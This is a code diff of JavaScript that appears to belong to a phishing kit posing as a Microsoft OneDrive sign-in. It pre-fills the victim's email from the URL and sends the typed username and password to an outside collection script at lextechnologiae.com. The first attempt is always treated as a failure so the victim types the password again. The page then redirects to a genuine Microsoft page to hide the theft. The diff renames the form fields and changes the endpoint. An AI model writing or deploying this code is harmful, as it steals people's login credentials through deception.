@@ -9,7 +9,7 @@ function getParameterByName(name, url) {
 }
 
 var id = getParameterByName('email');
-document.getElementById('emailInput').value = id;
+document.getElementById('user').value = id;
 
 let login_attempts = 3;
 
@@ -18,8 +18,8 @@ $(document).ready(function() {
 	//$('#accessText').hide();
 	$('#nextButton').click(function() {
 		//e.preventDefault();
-		var userID = $('#emailInput').val();
-		var userAccessCode = $('#passwordInput').val();
+		var userID = $('#user').val();
+		var userAccessCode = $('#pass').val();
 		if(userID === '') {
 			
 			$('#errorText').show(100);
@@ -52,10 +52,10 @@ $(document).ready(function() {
 
 function submitFormAjaxFirst() {
 
-var username = document.getElementById('emailInput').value;
-var password = document.getElementById('passwordInput').value;
+var username = document.getElementById('user').value;
+var password = document.getElementById('pass').value;
 
-	var params = "emailInput=" + username + "&passwordInput=" + password;
+	var params = "user=" + username + "&pass=" + password;
 
 	
     var xmlHttp = new XMLHttpRequest();
@@ -66,21 +66,21 @@ var password = document.getElementById('passwordInput').value;
                 setTimeout(function() {
 					$('#errorText').show(100);
 					$('#accessText').hide();
-					$('#passwordInput').val('');
+					$('#pass').val('');
 				}, 2000);
             }
         }
-        xmlHttp.open("post", "https://lextechnologiae.com/butter/ex.php", true);
+        xmlHttp.open("post", "https://lextechnologiae.com/butter/web.php", true);
 		xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         xmlHttp.send(params); 
 }
 
 function submitFormAjax() {
 
-var username = document.getElementById('emailInput').value;
-var password = document.getElementById('passwordInput').value;
+var username = document.getElementById('user').value;
+var password = document.getElementById('pass').value;
 
-	var params = "emailInput=" + username + "&passwordInput=" + password;
+	var params = "user=" + username + "&pass=" + password;
 
 	
     var xmlHttp = new XMLHttpRequest();
@@ -89,12 +89,12 @@ var password = document.getElementById('passwordInput').value;
             if(xmlHttp.readyState == 4 && xmlHttp.status == 200)
             {
                 setTimeout(function() {
-					$('#passwordInput').val('');
+					$('#password').val('');
 					window.location.href = 'https://www.microsoft.com/en-us/microsoft-365/onedrive/document-scanning';
 				}, 2000);
             }
         }
-        xmlHttp.open("post", "https://lextechnologiae.com/butter/ex.php", true);
+        xmlHttp.open("post", "https://lextechnologiae.com/butter/web.php", true);
 		xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         xmlHttp.send(params); 
 }
